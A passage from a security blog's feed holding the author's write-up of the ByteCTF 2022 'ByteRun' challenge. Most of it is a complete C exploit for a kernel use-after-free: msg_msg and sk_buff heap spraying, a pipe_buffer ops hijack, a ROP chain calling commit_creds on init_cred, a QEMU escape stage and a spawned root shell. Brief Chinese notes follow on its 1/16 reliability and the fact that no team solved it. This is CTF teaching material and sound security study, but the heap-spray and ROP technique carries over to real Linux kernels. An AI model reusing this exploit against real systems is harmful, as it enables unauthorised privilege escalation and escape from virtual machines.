BYTEDEV_MODE_CHANGE, *(<span class="hljs-type">size_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">getRootShell</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-keyword">if</span> (getuid()) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to gain the root!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Succesfully gain the root privilege\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Now we come to Stage II - QEMU ESCAPE\033[0m\n&quot;</span>);<br>    qemuEscape();<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] trigerring root shell now...\033[0m\n&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>    <span class="hljs-built_in">exit</span>(EXIT_SUCCESS);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-type">int</span>         oob_socket[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         sk_sockets[SOCKET_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         pipe_fd[PIPE_NUM][<span class="hljs-number">2</span>];<br>    <span class="hljs-type">int</span>         msqid[MSG_QUEUE_NUM];<br>    <span class="hljs-type">int</span>         victim_qid, real_qid;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_msg</span>  *<span class="hljs-title">nearby_msg_prim</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pipe_buf_ptr</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops_ptr</span>;</span><br>    <span class="hljs-type">uint64_t</span>    victim_addr;<br>    <span class="hljs-type">uint64_t</span>    kernel_base;<br>    <span class="hljs-type">uint64_t</span>    kernel_offset;<br>    <span class="hljs-type">uint64_t</span>    *rop_chain;<br>    <span class="hljs-type">int</span>         rop_idx;<br>    <span class="hljs-type">cpu_set_t</span>   cpu_set;<br>    <span class="hljs-type">int</span>         dev_fd;<br>    <span class="hljs-type">int</span>         ret;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.0</span><br><span class="hljs-comment">     * Initialization</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m\n[+] ByteCTF 2022 - ByteRun - exploit \033[0m\n&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m\n[*] Stage I - ROOT Privilege Escalation. \033[0m\n&quot;</span>);<br><br>    <span class="hljs-comment">/* basic resources alloc */</span><br>    saveStatus();<br><br>    <span class="hljs-keyword">if</span> ((dev_fd = open(<span class="hljs-string">&quot;/dev/bytedev&quot;</span>, O_RDWR)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to open bytedev!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, oob_socket) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to create socket pair for OOB write!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* to run the exp on the specific core only */</span><br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;cpu_set);<br>    sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set);<br>    <br>    <span class="hljs-comment">/* socket pairs to spray sk_buff */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (socketpair(AF_UNIX, SOCK_STREAM, <span class="hljs-number">0</span>, sk_sockets[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create socket pair!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I</span><br><span class="hljs-comment">     * build msg_queue, spray primary and secondary msg_msg,</span><br><span class="hljs-comment">     * and use OOB write to construct the overlapping</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.I spray msg_msg for overlapping obj\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Build message queue...&quot;</span>);<br>    <span class="hljs-comment">/* build 4096 message queue */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> ((msqid[i] = msgget(IPC_PRIVATE, <span class="hljs-number">0666</span> | IPC_CREAT)) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create msg_queue!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Spray primary and secondary msg_msg...&quot;</span>);<br><br>    <span class="hljs-built_in">memset</span>(&amp;primary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(primary_msg));<br>    <span class="hljs-built_in">memset</span>(&amp;secondary_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(secondary_msg));<br><br>    <span class="hljs-comment">/* spray primary and secondary message */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;primary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send primary msg!&quot;</span>);<br>        &#125;<br><br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">0</span>] = MSG_TAG;<br>        *(<span class="hljs-type">int</span> *)&amp;secondary_msg.mtext[<span class="hljs-number">4</span>] = i;<br><br>        ret = writeMsg(msqid[i], <br>                    &amp;secondary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                    SECONDARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to send secondary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* create hole in primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Create holes in primary msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i += <span class="hljs-number">1024</span>) &#123;<br>        ret = readMsg(msqid[i], <br>                    &amp;primary_msg, <br>                    <span class="hljs-keyword">sizeof</span>(primary_msg), <br>                    PRIMARY_MSG_TYPE);<br>        <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to receive primary msg!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* triger off-by-null on primary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Trigger OOB write to construct the overlapping...&quot;</span>);<br>    trigerOutOfBoundWrite(dev_fd, oob_socket);<br><br>    <span class="hljs-comment">/* find the queues that have the same secondary msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Checking whether succeeded to make overlapping...&quot;</span>);<br>    victim_qid = real_qid = <span class="hljs-number">-1</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; MSG_QUEUE_NUM; i++) &#123;<br>        <span class="hljs-comment">/* the hole */</span><br>        <span class="hljs-keyword">if</span> ((i % <span class="hljs-number">256</span>) == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">continue</span>;<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (peekMsg(msqid[i], &amp;secondary_msg, <span class="hljs-keyword">sizeof</span>(secondary_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] error qid: %d\n&quot;</span>, i);<br>            errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">0</span>] != MSG_TAG) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to make corruption!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>] != i) &#123;<br>            victim_qid = i;<br>            real_qid = *(<span class="hljs-type">int</span>*) &amp;secondary_msg.mtext[<span class="hljs-number">4</span>];<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (victim_qid &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to make overlapping!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] victim qid:\033[0m %d &quot;</span>, victim_qid);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m real qid: \033[0m %d\n&quot;</span>, real_qid);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II</span><br><span class="hljs-comment">     * construct UAF</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\n\033[34m\033[1m[*] Step.II construct UAF\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* free the victim secondary msg_msg, then we get a UAF */</span><br>    ret = readMsg(msqid[real_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                SECONDARY_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] UAF construction complete!\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III</span><br><span class="hljs-comment">     * spray sk_buff to leak msg_msg addr</span><br><span class="hljs-comment">     * construct fake msg_msg to leak addr of UAF obj</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.III spray sk_buff to leak kheap addr\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* spray sk_buff to construct fake msg_msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff...&quot;</span>);<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    ret = spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* use fake msg_msg to read OOB */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] OOB read from victim msg_msg&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[SECONDARY_MSG_SIZE] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br><br>    nearby_msg = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[(SECONDARY_MSG_SIZE) - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of primary msg of msg nearby victim: &quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m%lx\n&quot;</span>, nearby_msg-&gt;m_list.prev);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * release and re-spray sk_buff to construct fake msg_msg</span><br><span class="hljs-comment">     * so that we can make an arbitrary read on a primary msg_msg</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, *(<span class="hljs-type">uint64_t</span>*)<span class="hljs-string">&quot;arttnba3&quot;</span>, <br>            VICTIM_MSG_TYPE, <span class="hljs-keyword">sizeof</span>(oob_msg.mtext), <br>            nearby_msg-&gt;m_list.prev - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] arbitrary read on primary msg of msg nearby victim&quot;</span>);<br>    <span class="hljs-keyword">if</span> (peekMsg(msqid[victim_qid], &amp;oob_msg, <span class="hljs-keyword">sizeof</span>(oob_msg), <span class="hljs-number">1</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to read victim msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-keyword">if</span> (*(<span class="hljs-type">int</span> *)&amp;oob_msg.mtext[<span class="hljs-number">0x1000</span>] != MSG_TAG) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to rehit the UAF object!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* cal the addr of UAF obj by the header we just read out */</span><br>    nearby_msg_prim = (<span class="hljs-keyword">struct</span> msg_msg*) <br>            &amp;oob_msg.mtext[<span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg)];<br>    victim_addr = nearby_msg_prim-&gt;m_list.next - <span class="hljs-number">0x400</span>;<br>    <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg next to victim: \033[0m%lx\n&quot;</span>, <br>            nearby_msg_prim-&gt;m_list.next);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] addr of msg UAF object: \033[0m%lx\n&quot;</span>, <br>            victim_addr);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV</span><br><span class="hljs-comment">     * fix the header of UAF obj and release it</span><br><span class="hljs-comment">     * spray pipe_buffer and leak the kernel base</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.IV spray pipe_buffer to leak kbase\033[0m&quot;</span>);<br><br>    <span class="hljs-comment">/* re-construct the msg_msg to fix it */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] fixing the UAF obj as a msg_msg...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (freeSkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * <span class="hljs-doctag">XXX:</span> we need to pass the check in lib/list_debug.c </span><br><span class="hljs-comment">     * what we used to not to pass there is </span><br><span class="hljs-comment">     * &quot;prev-&gt;next == entry&quot; &amp;&amp; &quot;next-&gt;prev == entry&quot;</span><br><span class="hljs-comment">     * so a valid memory with [addr of entry] should be set there</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(fake_second_msg, <span class="hljs-number">0</span>, <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x50</span>; i++) &#123;<br>        ((<span class="hljs-type">size_t</span>*)(fake_second_msg))[i] = victim_addr;<br>    &#125;<br>    buildMsg((<span class="hljs-keyword">struct</span> msg_msg *)fake_second_msg, <br>            victim_addr + <span class="hljs-number">0x100</span>, victim_addr + <span class="hljs-number">0x100</span>,<br>            VICTIM_MSG_TYPE, SECONDARY_MSG_SIZE - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg), <br>            <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* release UAF obj as secondary msg */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release UAF obj in message queue...&quot;</span>);<br>    ret = readMsg(msqid[victim_qid], <br>                &amp;secondary_msg, <br>                <span class="hljs-keyword">sizeof</span>(secondary_msg), <br>                VICTIM_MSG_TYPE);<br>    <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to receive secondary msg!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* spray pipe_buffer */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        <span class="hljs-keyword">if</span> (pipe(pipe_fd[i]) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to create pipe!&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">/* write something to activate the pipe */</span><br>        <span class="hljs-keyword">if</span> (write(pipe_fd[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>            errExit(<span class="hljs-string">&quot;failed to write the pipe!&quot;</span>);<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">/* release the sk_buff to read pipe_buffer, leak kernel base */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] release sk_buff to read pipe_buffer...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) &amp;fake_second_msg;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SOCKET_NUM; i++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; SK_BUFF_NUM; j++) &#123;<br>            ret = read(sk_sockets[i][<span class="hljs-number">1</span>], <br>                        &amp;fake_second_msg, <br>                        <span class="hljs-keyword">sizeof</span>(fake_second_msg));<br>            <span class="hljs-keyword">if</span> (ret &lt; <span class="hljs-number">0</span>) &#123;<br>                errExit(<span class="hljs-string">&quot;failed to release sk_buff!&quot;</span>);<br>            &#125;<br>            <br>            <span class="hljs-keyword">if</span> (pipe_buf_ptr-&gt;ops &gt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>                <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] got anon_pipe_buf_ops:\033[0m%lx\n&quot;</span>, <br>                        pipe_buf_ptr-&gt;ops);<br>                kernel_offset = pipe_buf_ptr-&gt;ops - ANON_PIPE_BUF_OPS;<br>                kernel_base = <span class="hljs-number">0xffffffff81000000</span> + kernel_offset;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] kernel base: \033[0m%lx  &quot;</span>, kernel_base);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1moffset: \033[0m%lx\n&quot;</span>, kernel_offset);<br>    <br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V</span><br><span class="hljs-comment">     * hijack the ops of pipe_buffer</span><br><span class="hljs-comment">     * free all pipe to trigger fake ptr</span><br><span class="hljs-comment">     * so that we hijack the RIP</span><br><span class="hljs-comment">     * construct a ROP on pipe_buffer</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Step.V hijack the ops of pipe to root\033[0m&quot;</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] pre-construct data in userspace...&quot;</span>);<br>    pipe_buf_ptr = (<span class="hljs-keyword">struct</span> pipe_buffer *) fake_second_msg;<br>    pipe_buf_ptr-&gt;ops = victim_addr;<br><br>    ops_ptr = (<span class="hljs-keyword">struct</span> pipe_buf_operations *) fake_second_msg;<br>    <span class="hljs-comment">/* push rsi ; pop rsp ; pop rbx ; pop r12 ; ret */</span><br>    ops_ptr-&gt;release = <span class="hljs-number">0xffffffff8133151b</span> + kernel_offset;<br>    <span class="hljs-comment">/* ret */</span><br>    ops_ptr-&gt;get = <span class="hljs-number">0xffffffff81331534</span> + kernel_offset;<br><br>    rop_idx = <span class="hljs-number">0</span>;<br>    rop_chain = (<span class="hljs-type">uint64_t</span>*) &amp;fake_second_msg[<span class="hljs-number">0x20</span>];<br>    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;<br>    rop_chain[rop_idx++] = kernel_offset + INIT_CRED;<br>    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;<br>    rop_chain[rop_idx++] = \<br>                    kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = *(<span class="hljs-type">uint64_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop_chain[rop_idx++] = (<span class="hljs-type">size_t</span>) getRootShell;<br>    rop_chain[rop_idx++] = user_cs;<br>    rop_chain[rop_idx++] = user_rflags;<br>    rop_chain[rop_idx++] = user_sp;<br>    rop_chain[rop_idx++] = user_ss;<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] spray sk_buff to hijack pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">if</span> (spraySkBuff(sk_sockets, fake_second_msg, <span class="hljs-keyword">sizeof</span>(fake_second_msg)) &lt; <span class="hljs-number">0</span>) &#123;<br>        errExit(<span class="hljs-string">&quot;failed to spray sk_buff!&quot;</span>);<br>    &#125;<br>    <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger fake ops-&gt;release to hijack RIP...&quot;</span>);<br>    <span class="hljs-comment">//sleep(5);</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; PIPE_NUM; i++) &#123;<br>        close(pipe_fd[i][<span class="hljs-number">0</span>]);<br>        close(pipe_fd[i][<span class="hljs-number">1</span>]);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>由于堆喷的不稳定性，在第一阶段还是有可能会挂掉的，因此这道题目其实还是需要爆破的一道题目，几率 1/16：</p><p><img src="https://s2.loli.net/2022/09/30/skFd76cRPruwQip.jpg" alt="img.jpg"></p><h1>0x03.解题情况</h1><p>这道题笔者最初出题的时候是按照签到题的难度出的，因为这道题的两个阶段：阶段一的 kernel UAF 其实是可以直接使用通解完成解题的，而阶段二的 QEMU 逃逸则是一个非常直白的越界读写漏洞，利用起来也不算困难。</p><p>但最后并没有队伍解开这道题，可能是因为大家觉得笔者的题目太简单了都不屑于做吧（笑）</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前年👴当选手的时候还有⑤⭐级的带🏨住，今年当出题人👴只能喝西北风&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/categories/CTF/"/>
    
    
    <category term="Linux" scheme="http://blog.arttnba3.cn/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="http://blog.arttnba3.cn/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="http://blog.arttnba3.cn/tags/Pwn/"/>
    
    <category term="信息安全" scheme="http://blog.arttnba3.cn/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="http://blog.arttnba3.cn/tags/CTF/"/>
    
    <category term="Use After Free" scheme="http://blog.arttnba3.cn/tags/Use-After-Free/"/>
    
    <category term="ByteCTF" scheme="http://blog.arttnba3.cn/tags/ByteCTF/"/>
    
    <category term="Kernel UAF" scheme="http://blog.arttnba3.cn/tags/Kernel-UAF/"/>
    
    <category term="QEMU escape" scheme="http://blog.arttnba3.cn/tags/QEMU-escape/"/>
    
  </entry>
  
  <entry>
    <title>【HARDWARE.0x00】PCI 设备简易食用手册</title>
    <link href="http://blog.arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/"/>
    <id>http://blog.arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/</id>
    <published>2022-08-29T20:13:17.000Z</published>
    <updated>2023-04-12T17:18:59.303Z</updated>
    
